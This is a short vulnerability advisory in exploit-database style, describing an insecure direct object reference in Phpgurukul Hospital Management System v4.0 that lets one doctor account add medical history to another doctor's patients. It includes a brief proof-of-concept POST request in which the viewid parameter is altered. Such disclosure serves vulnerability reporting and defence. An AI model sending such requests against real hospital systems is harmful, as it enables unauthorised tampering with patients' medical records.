# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to add medical history for patient who is managed by other doctor(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /hospital/hms/doctor/view-patient.php?viewid=2(CHANGE HERE) HTTP/1.1
...

bp=90&bs=6.9&weight=90&temp=37&pres=AAAAA&submit=
```